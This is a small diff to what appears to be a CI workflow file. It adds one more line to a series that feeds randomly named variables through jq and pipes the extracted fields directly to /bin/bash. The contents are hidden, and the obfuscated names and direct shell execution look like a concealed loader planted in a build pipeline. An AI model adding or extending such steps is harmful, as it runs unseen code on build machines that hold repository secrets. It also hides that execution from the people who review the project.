@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$vifln31617" | jq -r .sbzl715 | /bin/bash
           echo $ssx53 | jq -r .i606 | /bin/bash
           echo $kp484 | jq -r .snqb3 | /bin/bash
+          echo $pasvs6 | jq -r .i1298 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
